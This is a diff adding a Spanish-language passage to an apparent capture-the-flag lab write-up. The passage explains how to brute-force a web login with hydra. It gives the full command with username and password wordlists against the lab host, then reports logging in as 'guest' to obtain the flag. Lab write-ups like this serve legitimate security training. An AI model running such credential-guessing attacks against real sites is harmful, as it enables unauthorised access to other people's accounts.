@@ -31,9 +31,19 @@ root@ine# curl http://target.ine.local/secured/flag.txt
 
 ## Flag 3: The login form seems a bit weak. Trying out different combinations might just reveal the next flag.
 
+Para esta flag podemos realizar un ataque de fuerza bruta contra el login de la web. Para ello usamos el servicio `http-post-form` en hydra, que necesita conocer el nombre de los campos a atacar, en este caso: usuario y contraseña. Al tratarse de un formulario html, podemos conocer los nombre viendo el código fuente de la página desde el navegador.
 
+![fuente](img/fuente)
 
-![dirb](img/dirb)
+```console
+root@ine# hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P Desktop/wordlists/100-common-passwords.txt target.ine.local http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid username or password"
+```
+
+![hydra](img/hydra)
+
+Iniciamos sesión con el usuario guest y obtenemos la flag
+
+![flag3](img/flag3)
 
 ## Flag 4: The login form behaves oddly with unexpected inputs. Think of injection techniques to access the 'admin'
 
